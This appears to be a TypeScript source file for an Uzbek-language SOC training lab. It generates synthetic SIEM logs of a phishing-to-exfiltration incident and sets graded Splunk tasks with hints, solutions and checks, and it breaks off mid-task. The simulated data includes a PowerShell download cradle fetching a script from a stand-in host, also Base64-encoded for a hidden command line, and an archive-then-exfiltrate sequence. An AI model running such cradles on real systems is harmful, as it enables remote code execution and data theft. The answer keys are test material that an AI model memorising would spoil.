import type { Lab } from '../types';
import type { Row, SiemEvent } from '../../engine/siem/types';
import { column } from '../../engine/siem';
import { strftime } from '../../engine/siem/values';
import { kql, spl } from './run';
import { colIs, oneNumber, prng, utc } from './siem';

/*
 * The SOC track's running incident (WS-BUX-014, d.karimova, 2026-11-16) as SIEM data, following the final timeline
 * in the b3 IR report lesson: phishing at 04:14:21 to 37 mailboxes, Word → PowerShell at 04:32:14, payload and Run
 * key at 04:32:17–18, beacons to 203.0.113.45:443 every ~60 s from 04:33, two other users clicking the link at
 * 04:41, 14 MB out at 05:05:40, isolation at 05:52. All times UTC.
 */

export const C2_IP = '203.0.113.45';
export const C2_HOST = 'update-check.example-cdn.net';
export const VICTIM = 'WS-BUX-014';
export const VICTIM_IP = '10.10.10.23';
export const VICTIM_USER = 'd.karimova';
/** SHA-256 of the text "KiberAkademiya lab sample: upd.bin" — a real digest standing in for the payload. */
export const PAYLOAD_SHA256 = 'bea66f0dc7f16535a692625802c5b9e55006572921298c727475c57684b4ba1a';
/** SHA-256 of "KiberAkademiya lab sample: inventory.ps1" (the IT inventory script). */
const INVENTORY_SHA256 = 'eb0541f96f613d95aa893c384a84fbd94f4c44c69111cadc825cb326b87f0bf6';
const PAYLOAD_PATH = `C:\\Users\\${VICTIM_USER}\\AppData\\Roaming\\svchost.exe`;
const RUN_KEY = 'HKU\\S-1-5-21-3311-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater';
const PHISH_SENDER = 'billing@invoice-pay.example';
const PHISH_SUBJECT = "Hisob-faktura №1147: to'lov muddati bugun";
const PHISH_FILE = 'Hisob-faktura_1147.docm';
export const EXFIL_BYTES = 14 * 1024 * 1024;

const OFFICE16 = 'C:\\Program Files\\Microsoft Office\\root\\Office16';
const PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
const SYS32 = 'C:\\Windows\\System32';

/** PowerShell -EncodedCommand takes Base64 of UTF-16LE text. */
function encodePs(text: string): string {
  let bin = '';
  for (const ch of text) {
    const c = ch.charCodeAt(0);
    bin += String.fromCharCode(c & 0xff, c >> 8);
  }
  return btoa(bin);
}

const CRADLE = `IEX (New-Object Net.WebClient).DownloadString('http://${C2_HOST}/a.ps1')`;
export const ENCODED = encodePs(CRADLE);

interface Host {
  name: string;
  ip: string;
  user: string;
}

const HOSTS: Host[] = [
  ...['a.qodirov', 'm.rahimova', 'z.yusupova', 'b.ergashev', 'n.saidova', 'o.tursunov', 'k.aminova', 's.aliyeva', 'f.karimov', 'r.nazarov', 'g.olimova', 'u.hasanov', 'l.sobirova'].map((user, i) => ({
    name: `WS-BUX-${String(i + 1).padStart(3, '0')}`,
    ip: `10.10.10.${10 + i}`,
    user,
  })),
  { name: VICTIM, ip: VICTIM_IP, user: VICTIM_USER },
  { name: 'WS-IT-002', ip: '10.10.30.12', user: 'j.tursunov' },
  { name: 'WS-HR-005', ip: '10.10.20.15', user: 'd.qosimova' },
  { name: 'WS-SAV-003', ip: '10.10.20.31', user: 'i.mirzayev' },
  { name: 'WS-DIR-001', ip: '10.10.20.5', user: 'a.rasulov' },
];
const CLICKERS = ['s.aliyeva', 'r.nazarov'];
const PROXY_SITES: [string, string][] = [
  ['portal.mybank.uz', 'Financial Services'],
  ['soliq.example.uz', 'Government'],
  ['news.example.com', 'News'],
  ['docs.example.org', 'Business'],
  ['cdn.example.net', 'Content Delivery Networks'],
  ['mail.example.com', 'Web Email'],
  ['1c.example.uz', 'Business'],
];
const OUTSIDE_IPS = ['198.51.100.14', '198.51.100.27', '198.51.100.80', '192.0.2.44', '192.0.2.71', '192.0.2.90'];

export interface IncidentData {
  indexes: Record<string, SiemEvent[]>;
  tables: Record<string, Row[]>;
}

function build(): IncidentData {
  const rnd = prng(20261116);
  const pick = <T,>(xs: T[]) => xs[Math.floor(rnd() * xs.length)]!;
  const email: SiemEvent[] = [];
  const win: SiemEvent[] = [];
  const sysmon: SiemEvent[] = [];
  const pwsh: SiemEvent[] = [];
  const proxy: SiemEvent[] = [];
  const fw: SiemEvent[] = [];
  const iso = (t: number) => strftime(t, '%Y-%m-%dT%H:%M:%S.000Z');
  let pid = 4100;

  const proc = (t: number, h: Host, image: string, cmd: string, parent: string, extra: Record<string, string | number> = {}) => {
    const id = pid++;
    const user = image.startsWith(SYS32) && !image.endsWith('powershell.exe') && !image.endsWith('cmd.exe') ? 'NT AUTHORITY\\SYSTEM' : `CORP\\${h.user}`;
    sysmon.push({
      _time: t,
      _raw: `${iso(t)} EventCode=1 Computer=${h.name}.corp.local User=${user} ProcessId=${id} Image=${image} ParentImage=${parent} CommandLine=${cmd}`,
      index: 'sysmon',
      sourcetype: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
      host: h.name,
      source: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
      EventCode: 1,
      User: user,
      ProcessId: id,
      Image: image,
      ParentImage: parent,
      CommandLine: cmd,
      ...extra,
    });
    return id;
  };
  const sys = (t: number, h: Host, code: number, image: string, fields: Record<string, string | number>) => {
    const kv = Object.entries(fields).map(([k, v]) => `${k}=${v}`).join(' ');
    sysmon.push({ _time: t, _raw: `${iso(t)} EventCode=${code} Computer=${h.name}.corp.local Image=${image} ${kv}`, index: 'sysmon', sourcetype: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational', host: h.name, source: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational', EventCode: code, Image: image, ...fields });
  };
  const firewall = (t: number, src: string, dst: string, port: number, out: number, inb: number, app = 'ssl') => {
    fw.push({ _time: t, _raw: `${strftime(t, '%Y/%m/%d %H:%M:%S')},TRAFFIC,end,${src},${dst},${port},${app},allow,${out},${inb}`, index: 'firewall', sourcetype: 'pan:traffic', host: 'fw-edge-01', source: 'udp:514', src_ip: src, dest_ip: dst, dest_port: port, app, action: 'allow', bytes_out: out, bytes_in: inb });
  };
  const web = (t: number, h: Host, host: string, path: string, status: number, bytesIn: number, category: string) => {
    const url = `http://${host}${path}`;
    proxy.push({ _time: t, _raw: `${iso(t)} ${h.ip} ${h.user} GET ${url} ${status} ${bytesIn} "${category}"`, index: 'proxy', sourcetype: 'proxy:access', host: 'proxy-01', source: '/var/log/proxy/access.log', src_ip: h.ip, user: h.user, http_method: 'GET', url, dest_host: host, uri_path: path, status, bytes_in: bytesIn, bytes_out: 420 + Math.floor(rnd() * 300), category, action: 'allowed' });
  };
  const mail = (t: number, from: string, to: string, subject: string, attachment: string | null, url: string | null, action = 'Delivered') => {
    email.push({ _time: t, _raw: `${iso(t)} ${action} from=${from} to=${to} subject="${subject}"${attachment ? ` attachment=${attachment}` : ''}`, index: 'email', sourcetype: 'o365:messagetrace', host: 'exchange-online', source: 'o365', sender: from, recipient: to, subject, action, ...(attachment ? { attachment } : {}), ...(url ? { url } : {}) });
  };

  const dayStart = utc('2026-11-16T03:50:00Z');
  // Morning logons and the ordinary office day on every host.
  for (const h of HOSTS) {
    const logon = dayStart + 300 + Math.floor(rnd() * 1500);
    win.push({ _time: logon, _raw: `${iso(logon)} EventCode=4624 ComputerName=${h.name}.corp.local Account_Name=${h.user} Logon_Type=2 Source_Network_Address=-`, index: 'wineventlog', sourcetype: 'WinEventLog:Security', host: h.name, source: 'WinEventLog:Security', EventCode: 4624, Account_Name: h.user, Logon_Type: 2 });
    let t = logon + 20;
    proc(t, h, 'C:\\Windows\\explorer.exe', 'C:\\Windows\\explorer.exe', `${SYS32}\\userinit.exe`);
    t += 30;
    proc(t, h, `${OFFICE16}\\OUTLOOK.EXE`, `"${OFFICE16}\\OUTLOOK.EXE"`, 'C:\\Windows\\explorer.exe');
    proc(t + 4, h, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', 'C:\\Windows\\explorer.exe');
    for (let k = 0; k < 4; k++) {
      const tt = t + 600 + Math.floor(rnd() * 9000);
      if (rnd() < 0.5) proc(tt, h, `${OFFICE16}\\EXCEL.EXE`, `"${OFFICE16}\\EXCEL.EXE" "C:\\Users\\${h.user}\\Documents\\hisobot_${k + 1}.xlsx"`, 'C:\\Windows\\explorer.exe');
      else proc(tt, h, `${OFFICE16}\\WINWORD.EXE`, `"${OFFICE16}\\WINWORD.EXE" /n "C:\\Users\\${h.user}\\Documents\\xat_${k + 1}.docx"`, `${OFFICE16}\\OUTLOOK.EXE`);
    }
    // System services everywhere: svchost from System32 is normal.
    proc(dayStart + 60 + Math.floor(rnd() * 200), h, `${SYS32}\\svchost.exe`, `${SYS32}\\svchost.exe -k netsvcs -p -s Schedule`, `${SYS32}\\services.exe`);
    // 05:00 the IT inventory script runs on every machine — PowerShell that is not an attack.
    const inv = utc('2026-11-16T05:00:00Z') + Math.floor(rnd() * 120);
    proc(inv, h, PS, `${PS} -NoProfile -ExecutionPolicy Bypass -File \\\\fs01\\scripts\\inventory.ps1`, `${SYS32}\\svchost.exe`, { SHA256: INVENTORY_SHA256 });
    pwsh.push({ _time: inv + 1, _raw: `${iso(inv + 1)} EventCode=4104 Computer=${h.name}.corp.local ScriptBlockText=Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | Export-Csv \\\\fs01\\inventory\\${h.name}.csv`, index: 'powershell', sourcetype: 'XmlWinEventLog:Microsoft-Windows-PowerShell/Operational', host: h.name, source: 'XmlWinEventLog:Microsoft-Windows-PowerShell/Operational', EventCode: 4104, ScriptBlockText: `Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | Export-Csv \\\\fs01\\inventory\\${h.name}.csv` });
    // Browsing and ordinary outbound TLS.
    for (let k = 0; k < 10; k++) {
      const tt = logon + 120 + Math.floor(rnd() * 10000);
      const [site, cat] = pick(PROXY_SITES);
      web(tt, h, site, pick(['/', '/index', '/login', '/api/v2/items', '/static/main.js']), 200, 2000 + Math.floor(rnd() * 60000), cat);
      firewall(tt + 1, h.ip, pick(OUTSIDE_IPS), 443, 900 + Math.floor(rnd() * 4000), 3000 + Math.floor(rnd() * 90000));
    }
  }
  // The IT admin runs PowerShell interactively — also normal, and a good false positive for "any PowerShell".
  const it = HOSTS.find((h) => h.name === 'WS-IT-002')!;
  for (const [i, c] of ['Get-ADUser -Filter * -SearchBase "OU=Buxgalteriya,DC=corp,DC=local"', 'Get-Service -ComputerName fs01', 'Test-NetConnection fs01 -Port 445'].entries()) {
    const t = utc('2026-11-16T04:20:00Z') + i * 400;
    proc(t, it, PS, `${PS} -NoExit -Command ${c}`, 'C:\\Windows\\explorer.exe');
    pwsh.push({ _time: t + 1, _raw: `${iso(t + 1)} EventCode=4104 Computer=${it.name}.corp.local ScriptBlockText=${c}`, index: 'powershell', sourcetype: 'XmlWinEventLog:Microsoft-Windows-PowerShell/Operational', host: it.name, source: 'XmlWinEventLog:Microsoft-Windows-PowerShell/Operational', EventCode: 4104, ScriptBlockText: c });
  }

  // Ordinary mail through the morning.
  for (let k = 0; k < 60; k++) {
    const t = dayStart + 600 + Math.floor(rnd() * 10000);
    const to = pick(HOSTS);
    const from = pick(HOSTS);
    mail(t, `${from.user}@corp.example.uz`, `${to.user}@corp.example.uz`, pick(['Oylik hisobot', 'Majlis 15:00 da', 'Shartnoma loyihasi', "Ta'til grafigi", 'Re: akt sverka']), rnd() < 0.3 ? 'hujjat.pdf' : null, null);
  }
  // 04:14:21 — the phishing mail reaches 37 mailboxes (every host user plus other staff).
  const phishAt = utc('2026-11-16T04:14:21Z');
  const others = ['h.mavlonova', 'e.xolmatov', 't.jurayeva', 'v.ismoilov', 'p.qurbonova', 'x.normatov', 'y.alimova', 'q.sharipov', 'w.abdullayeva', 'c.raximov', 'bux.umumiy', 'kassa', 'info', 'hr', 'reception', 'zakupka', 'sklad', 'yurist', 'marketing'];
  const recipients = [...HOSTS.map((h) => h.user), ...others].slice(0, 37);
  recipients.forEach((r, i) => mail(phishAt + Math.floor(i / 6), PHISH_SENDER, `${r}@corp.example.uz`, PHISH_SUBJECT, PHISH_FILE, `http://${C2_HOST}/invoice/1147`));

  // ── WS-BUX-014
  const v = HOSTS.find((h) => h.name === VICTIM)!;
  const at = (s: string) => utc(`2026-11-16T${s}Z`);
  proc(at('04:31:58'), v, `${OFFICE16}\\WINWORD.EXE`, `"${OFFICE16}\\WINWORD.EXE" /n "C:\\Users\\${VICTIM_USER}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\X7K2QW1P\\${PHISH_FILE}"`, `${OFFICE16}\\OUTLOOK.EXE`);
  proc(at('04:32:14'), v, PS, `powershell.exe -nop -w hidden -enc ${ENCODED}`, `${OFFICE16}\\WINWORD.EXE`);
  pwsh.push({ _time: at('04:32:14'), _raw: `${iso(at('04:32:14'))} EventCode=4104 Computer=${VICTIM}.corp.local ScriptBlockText=${CRADLE}`, index: 'powershell', sourcetype: 'XmlWinEventLog:Microsoft-Windows-PowerShell/Operational', host: VICTIM, source: 'XmlWinEventLog:Microsoft-Windows-PowerShell/Operational', EventCode: 4104, ScriptBlockText: CRADLE });
  sys(at('04:32:14'), v, 22, PS, { QueryName: C2_HOST, QueryResults: C2_IP });
  sys(at('04:32:15'), v, 3, PS, { DestinationIp: C2_IP, DestinationPort: 80, DestinationHostname: C2_HOST, Protocol: 'tcp' });
  web(at('04:32:15'), v, C2_HOST, '/a.ps1', 200, 2310, 'Newly Registered Websites');
  web(at('04:32:16'), v, C2_HOST, '/upd.bin', 200, 184_320, 'Newly Registered Websites');
  sys(at('04:32:17'), v, 11, PS, { TargetFilename: PAYLOAD_PATH });
  proc(at('04:32:17'), v, PAYLOAD_PATH, `"${PAYLOAD_PATH}"`, PS, { SHA256: PAYLOAD_SHA256 });
  sys(at('04:32:18'), v, 13, PAYLOAD_PATH, { EventType: 'SetValue', TargetObject: RUN_KEY, Details: PAYLOAD_PATH });
  // Beacons every ~60 s until the EDR isolates the host at 05:52.
  let tb = at('04:33:02');
  const isolated = at('05:52:00');
  let first = true;
  while (tb < isolated) {
    if (first) sys(tb, v, 22, PAYLOAD_PATH, { QueryName: C2_HOST, QueryResults: C2_IP });
    first = false;
    sys(tb, v, 3, PAYLOAD_PATH, { DestinationIp: C2_IP, DestinationPort: 443, DestinationHostname: C2_HOST, Protocol: 'tcp' });
    firewall(tb, VICTIM_IP, C2_IP, 443, 380 + Math.floor(rnd() * 320), 210 + Math.floor(rnd() * 700));
    tb += 57 + Math.floor(rnd() * 7);
  }
  // 05:05 — documents are gathered and sent out.
  proc(at('05:05:21'), v, `${SYS32}\\cmd.exe`, 'cmd.exe /c dir \\\\fs01\\buxgalteriya /s /b', PAYLOAD_PATH);
  proc(at('05:05:31'), v, PS, 'powershell.exe -nop -c Compress-Archive -Path \\\\fs01\\buxgalteriya\\2026 -DestinationPath C:\\Users\\Public\\b.zip', PAYLOAD_PATH);
  sys(at('05:05:38'), v, 11, PS, { TargetFilename: 'C:\\Users\\Public\\b.zip' });
  sys(at('05:05:40'), v, 3, PAYLOAD_PATH, { DestinationIp: C2_IP, DestinationPort: 443, DestinationHostname: C2_HOST, Protocol: 'tcp' });
  firewall(at('05:05:40'), VICTIM_IP, C2_IP, 443, EXFIL_BYTES, 4_120);

  // 04:41 — two colleagues click the link in the mail; the browser gets a page, no attachment is opened.
  for (const [i, user] of CLICKERS.entries()) {
    const h = HOSTS.find((x) => x.user === user)!;
    web(at('04:41:05') + i * 37, h, C2_HOST, '/invoice/1147', 200, 1_210, 'Newly Registered Websites');
  }

  // Sentinel / Defender tables derived from the same events.
  const dev = (h: string) => h.toLowerCase() + '.corp.local';
  const leaf = (p: string) => p.split('\\').pop()!;
  const folder = (p: string) => p.split('\\').slice(0, -1).join('\\');
  const DeviceProcessEvents: Row[] = sysmon
    .filter((e) => e.EventCode === 1)
    .map((e) => ({
      Timestamp: e._time,
      DeviceName: dev(e.host),
      AccountName: String(e.User).replace(/^.*\\/, '').toLowerCase(),
      FileName: leaf(String(e.Image)),
      FolderPath: String(e.Image),
      ProcessCommandLine: String(e.CommandLine),
      InitiatingProcessFileName: leaf(String(e.ParentImage)),
      InitiatingProcessFolderPath: folder(String(e.ParentImage)),
      ...(e.SHA256 ? { SHA256: String(e.SHA256) } : {}),
    }));
  const DeviceNetworkEvents: Row[] = sysmon
    .filter((e) => e.EventCode === 3)
    .map((e) => ({ Timestamp: e._time, DeviceName: dev(e.host), ActionType: 'ConnectionSuccess', RemoteIP: String(e.DestinationIp), RemotePort: Number(e.DestinationPort), RemoteUrl: String(e.DestinationHostname), InitiatingProcessFileName: leaf(String(e.Image)), InitiatingProcessFolderPath: folder(String(e.Image)) }));
  // Ordinary connections of every host, so the C2 is not the only thing in the table.
  for (const e of fw.filter((x) => x.dest_ip !== C2_IP)) {
    const h = HOSTS.find((x) => x.ip === e.src_ip)!;
    DeviceNetworkEvents.push({ Timestamp: e._time, DeviceName: dev(h.name), ActionType: 'ConnectionSuccess', RemoteIP: String(e.dest_ip), RemotePort: 443, RemoteUrl: '', InitiatingProcessFileName: 'chrome.exe', InitiatingProcessFolderPath: 'C:\\Program Files\\Google\\Chrome\\Application' });
  }
  const DeviceRegistryEvents: Row[] = sysmon
    .filter((e) => e.EventCode === 13)
    .map((e) => {
      const key = String(e.TargetObject);
      return { Timestamp: e._time, DeviceName: dev(e.host), ActionType: 'RegistryValueSet', RegistryKey: key.slice(0, key.lastIndexOf('\\')), RegistryValueName: leaf(key), RegistryValueData: String(e.Details), InitiatingProcessFileName: leaf(String(e.Image)) };
    });
  // Ordinary Run-key writes by installers, so the registry table has more than one row.
  for (const [i, h] of HOSTS.slice(0, 5).entries()) {
    DeviceRegistryEvents.push({ Timestamp: at('04:05:00') + i * 61, DeviceName: dev(h.name), ActionType: 'RegistryValueSet', RegistryKey: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', RegistryValueName: 'Teams', RegistryValueData: 'C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe --process-start-args "--system-initiated"', InitiatingProcessFileName: 'msiexec.exe' });
  }
  const EmailEvents: Row[] = email.map((e) => ({ Timestamp: e._time, SenderFromAddress: String(e.sender), RecipientEmailAddress: String(e.recipient), Subject: String(e.subject), AttachmentCount: e.attachment ? 1 : 0, DeliveryAction: String(e.action) }));

  return {
    indexes: { email, wineventlog: win, sysmon, powershell: pwsh, proxy, firewall: fw },
    tables: { DeviceProcessEvents, DeviceNetworkEvents, DeviceRegistryEvents, EmailEvents },
  };
}

export const INCIDENT = build();

export const THREAT_INTEL: Row[] = [
  { indicator: C2_IP, type: 'ip', threat: 'C2 (update-check kampaniyasi)', first_seen: '2026-11-13' },
  { indicator: C2_HOST, type: 'domain', threat: 'C2 (update-check kampaniyasi)', first_seen: '2026-11-13' },
  { indicator: '198.51.100.200', type: 'ip', threat: 'Skaner', first_seen: '2026-10-02' },
];

// Expected answers, computed from the data.
const SY = INCIDENT.indexes.sysmon!;
const FW = INCIDENT.indexes.firewall!;
const PX = INCIDENT.indexes.proxy!;
const beacons = FW.filter((e) => e.dest_ip === C2_IP).sort((a, b) => a._time - b._time);
const BEACON_INTERVAL = Math.round((beacons[beacons.length - 1]!._time - beacons[0]!._time) / (beacons.length - 1));
const C2_PROXY_ROWS = PX.filter((e) => e.dest_host === C2_HOST).length;
const PS_HOSTS_PARENTS = new Set(SY.filter((e) => e.EventCode === 1 && String(e.Image).endsWith('powershell.exe')).map((e) => `${e.host}|${e.ParentImage}`)).size;
const NET = INCIDENT.tables.DeviceNetworkEvents!.filter((r) => r.RemoteIP === C2_IP).sort((a, b) => Number(a.Timestamp) - Number(b.Timestamp));
const C2_MINUTES = Math.trunc((Number(NET[NET.length - 1]!.Timestamp) - Number(NET[0]!.Timestamp)) / 60);
const isSpl = (s: { lang: string } | undefined) => s?.lang === 'spl';
const isKql = (s: { lang: string } | undefined) => s?.lang === 'kql';

export const siemIncident: Lab = {
  id: 'siem-ws-bux-014',
  title: 'SIEM: WS-BUX-014 insidentini tiklash',
  summary: "SOC tarmog'idagi insidentni Splunk va Sentinel'da boshidan oxirigacha tergov qilish: Word → PowerShell, payload, persistence, beaconing, ma'lumot chiqishi, phishing qamrovi, IOC qidiruvi.",
  minutes: 90,
  level: 3,
  panes: ['siem'],
  intro:
    "2026-yil 16-noyabr, 05:41 UTC. SIEM ogohlantirishi: **\"Word'dan PowerShell ishga tushdi — WS-BUX-014\"** (b2 bosqichidagi Sigma qoidasi). Qurilma egasi — buxgalter **d.karimova**. b1–b3 darslarida bu insidentni bo'laklab ko'rgansiz; endi uni o'zingiz SIEM'da tiklaysiz.\n\n" +
    "Splunk indekslari: `sysmon` (EventCode 1 jarayon, 3 tarmoq, 11 fayl, 13 registr, 22 DNS), `powershell` (4104 — skript bloklari), `wineventlog` (4624 kirishlar), `proxy`, `firewall`, `email`. Lookup: `threat_intel`.\n\n" +
    "Oxirgi topshiriqlar **KQL (Sentinel)** yorlig'ida — Microsoft Defender jadvallari: `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceRegistryEvents`, `EmailEvents`. Bir xil savolni ikkinchi tilda berish — ish e'lonlarida ikkalasi ham so'raladi.\n\n" +
    "Vaqtlar UTC (Toshkent = UTC+5). Windows yo'llarida teskari chiziq bor: SPL qidiruvida yulduzcha bilan yozish qulay — `ParentImage=*WINWORD.EXE`.",
  shell: () => ({
    fs: { home: { talaba: {} } },
    siem: { now: '2026-11-16T08:00:00Z', indexes: INCIDENT.indexes, tables: INCIDENT.tables, lookups: { threat_intel: THREAT_INTEL } },
  }),
  tasks: [
    {
      id: 'alert',
      teach: ['spl:search index=', 'spl:search *'],
      text: "Ogohlantirishni tasdiqlang: `sysmon` indeksida ota-jarayoni (`ParentImage`) Word bo'lgan jarayonlarni (`EventCode=1`) toping. Word kimni ishga tushirgan?",
      hint: '`index=sysmon EventCode=1 ParentImage=*WINWORD.EXE` — Word odatda hech qanday jarayon ishga tushirmaydi.',
      solution: [spl('index=sysmon EventCode=1 ParentImage=*WINWORD.EXE')],
      check: ({ siem }) => isSpl(siem) && siem!.result.mode === 'events' && siem!.result.rows.length >= 1 && siem!.result.rows.every((r) => String(r.ParentImage).endsWith('WINWORD.EXE')) && siem!.result.rows.some((r) => r.host === VICTIM),
    },
    {
      id: 'ps-noise',
      teach: ['spl:stats', 'spl:stats by'],
      text: "Nega \"PowerShell ishga tushdi\" qoidasi yetarli emas? Barcha `powershell.exe` jarayonlarini qurilma (`host`) va `ParentImage` bo'yicha sanang.",
      hint: '`index=sysmon EventCode=1 Image=*powershell.exe | stats count by host, ParentImage` — inventar skripti hamma joyda, IT admin ham ishlatadi. Shubhali faqat bitta qator.',
      solution: [spl('index=sysmon EventCode=1 Image=*powershell.exe | stats count by host, ParentImage')],
      check: ({ siem }) => isSpl(siem) && siem!.result.rows.length === PS_HOSTS_PARENTS && siem!.result.columns.includes('ParentImage'),
    },
    {
      id: 'cmdline',
      teach: ['spl:table'],
      text: "Word ishga tushirgan PowerShell'ning buyruq qatorini ko'ring: `_time host User CommandLine` jadvali.",
      hint: `\`index=sysmon EventCode=1 host=${VICTIM} ParentImage=*WINWORD.EXE | table _time host User CommandLine\` — -nop -w hidden -enc: profilsiz, yashirin oyna, kodlangan buyruq.`,
      solution: [spl(`index=sysmon EventCode=1 host=${VICTIM} ParentImage=*WINWORD.EXE | table _time host User CommandLine`)],
      check: ({ siem }) => isSpl(siem) && column(siem!.result, 'CommandLine').some((c) => c.includes('-enc')),
    },
    {
      id: 'scriptblock',
      text: "Kodlangan buyruqni qo'lda ochish shart emas: PowerShell **Script Block Logging** (EventCode 4104) bajarilgan kodni ochiq matnda yozadi. `powershell` indeksidan WS-BUX-014 ning skript bloklarini oling.",
      hint: `\`index=powershell host=${VICTIM} EventCode=4104 | table _time ScriptBlockText\` — DownloadString: boshqa serverdan skript yuklab, xotirada bajarish.`,
      solution: [spl(`index=powershell host=${VICTIM} EventCode=4104 | table _time ScriptBlockText`)],
      check: ({ siem }) => isSpl(siem) && column(siem!.result, 'ScriptBlockText').some((c) => c.includes(C2_HOST)),
    },
    {
      id: 'sequence',
      teach: ['spl:search earliest=', 'spl:search latest=', 'spl:sort +'],
      text: "04:31–04:35 oralig'ida WS-BUX-014 da Sysmon nima yozgan? Vaqt bo'yicha o'sish tartibida: `_time EventCode Image TargetFilename DestinationIp QueryName TargetObject`.",
      hint: `\`index=sysmon host=${VICTIM} earliest="11/16/2026:04:31:00" latest="11/16/2026:04:35:00" | sort _time | table _time EventCode Image TargetFilename DestinationIp QueryName TargetObject\``,
      solution: [spl(`index=sysmon host=${VICTIM} earliest="11/16/2026:04:31:00" latest="11/16/2026:04:35:00" | sort _time | table _time EventCode Image TargetFilename DestinationIp QueryName TargetObject`)],
      check: ({ siem }) => {
        const codes = siem ? column(siem.result, 'EventCode') : [];
        return isSpl(siem) && ['1', '3', '11', '13', '22'].every((c) => codes.includes(c)) && codes.indexOf('11') < codes.indexOf('13');
      },
    },
    {
      id: 'dropped',
      text: "PowerShell diskka qaysi faylni yozgan (EventCode 11)?",
      hint: `\`index=sysmon host=${VICTIM} EventCode=11 | table _time Image TargetFilename\``,
      solution: [spl(`index=sysmon host=${VICTIM} EventCode=11 | table _time Image TargetFilename`)],
      check: ({ siem }) => isSpl(siem) && column(siem!.result, 'TargetFilename').includes(PAYLOAD_PATH),
    },
    {
      id: 'persistence',
      text: "Qayta yuklanganda ham ishlashi uchun nima qilingan? Registrga yozuvlarni (EventCode 13) ko'ring.",
      hint: `\`index=sysmon host=${VICTIM} EventCode=13 | table _time Image TargetObject Details\` — Run kaliti: foydalanuvchi kirganda dastur avtomatik ishga tushadi.`,
      solution: [spl(`index=sysmon host=${VICTIM} EventCode=13 | table _time Image TargetObject Details`)],
      check: ({ siem }) => isSpl(siem) && column(siem!.result, 'TargetObject').some((c) => c.endsWith('\\Run\\Updater')),
    },
    {
      id: 'masquerade',
      teach: ['spl:search NOT'],
      text: "Fayl `svchost.exe` deb nomlangan — tizim jarayoni nomi. Haqiqiy svchost faqat `C:\\Windows\\System32` da bo'ladi. Boshqa joydan ishga tushgan barcha svchost'larni qurilma va yo'l bo'yicha sanang.",
      hint: '`index=sysmon EventCode=1 Image=*\\svchost.exe NOT Image="C:\\\\Windows\\\\System32\\\\svchost.exe" | stats count by host, Image` — qo\'shtirnoq ichida teskari chiziq ikki marta yoziladi.',
      solution: [spl('index=sysmon EventCode=1 Image=*\\svchost.exe NOT Image="C:\\\\Windows\\\\System32\\\\svchost.exe" | stats count by host, Image')],
      check: ({ siem }) => isSpl(siem) && colIs(siem!.result, 'Image', [PAYLOAD_PATH]),
    },
    {
      id: 'network',
      text: "Soxta svchost tarmoqda kim bilan gaplashadi? WS-BUX-014 ning tarmoq ulanishlarini (EventCode 3) jarayon, manzil va port bo'yicha sanang.",
      hint: `\`index=sysmon host=${VICTIM} EventCode=3 | stats count by Image, DestinationIp, DestinationPort\``,
      solution: [spl(`index=sysmon host=${VICTIM} EventCode=3 | stats count by Image, DestinationIp, DestinationPort`)],
      check: ({ siem }) => isSpl(siem) && siem!.result.rows.some((r) => r.Image === PAYLOAD_PATH && r.DestinationIp === C2_IP && Number(r.count) > 50),
    },
    {
      id: 'beacon-chart',
      teach: ['spl:timechart', 'spl:timechart span='],
      text: "Beaconing — muntazam \"qo'ng'iroqlar\". Firewall'da WS-BUX-014 → C2 ulanishlarini 5 daqiqalik oraliqlarda grafik qiling. Grafik qanday ko'rinadi?",
      hint: `\`index=firewall src_ip=${VICTIM_IP} dest_ip=${C2_IP} | timechart span=5m count\` — deyarli tekis chiziq: odam bunday muntazam ishlamaydi.`,
      solution: [spl(`index=firewall src_ip=${VICTIM_IP} dest_ip=${C2_IP} | timechart span=5m count`)],
      check: ({ siem }) => isSpl(siem) && !!siem!.result.chart && siem!.query.includes('span=5m') && siem!.query.includes(C2_IP),
    },
    {
      id: 'interval',
      teach: ['spl:stats min', 'spl:stats max', 'spl:eval'],
      text: "Beacon oralig'ini hisoblang: ulanishlar soni, birinchi va oxirgi vaqt (`min(_time)`, `max(_time)`), keyin `eval` bilan o'rtacha oraliq soniyalarda — butun songa yaxlitlab, `oraliq` nomli ustunda.",
      hint: `\`index=firewall src_ip=${VICTIM_IP} dest_ip=${C2_IP} | stats count, min(_time) as boshi, max(_time) as oxiri | eval oraliq=round((oxiri-boshi)/(count-1))\` — ~60 soniya.`,
      solution: [spl(`index=firewall src_ip=${VICTIM_IP} dest_ip=${C2_IP} | stats count, min(_time) as boshi, max(_time) as oxiri | eval oraliq=round((oxiri-boshi)/(count-1))`)],
      check: ({ siem }) => isSpl(siem) && oneNumber(siem!.result, 'oraliq') === BEACON_INTERVAL,
    },
    {
      id: 'exfil',
      teach: ['spl:sort -', 'spl:head'],
      text: "Eng katta chiquvchi sessiyani toping: WS-BUX-014 ning firewall yozuvlarini `bytes_out` bo'yicha kamayish tartibida saralab, birinchisini `_time dest_ip bytes_out` bilan ko'rsating.",
      hint: `\`index=firewall src_ip=${VICTIM_IP} | sort - bytes_out | head 1 | table _time dest_ip bytes_out\` — 14 MB, 05:05:40.`,
      solution: [spl(`index=firewall src_ip=${VICTIM_IP} | sort - bytes_out | head 1 | table _time dest_ip bytes_out`)],
      check: ({ siem }) => isSpl(siem) && siem!.result.rows.length === 1 && Number(siem!.result.rows[0]!.bytes_out) === EXFIL_BYTES,
    },
    {
      id: 'before-exfil',
      text: "Yuborishdan oldin nima bo'lgan? Soxta svchost ishga tushirgan jarayonlarni (`ParentImage` — payload yo'li) buyruq qatori bilan chiqaring.",
      hint: '`index=sysmon EventCode=1 ParentImage=*\\AppData\\Roaming\\svchost.exe | table _time Image CommandLine` — fayl serveridagi buxgalteriya papkasi arxivlangan.',
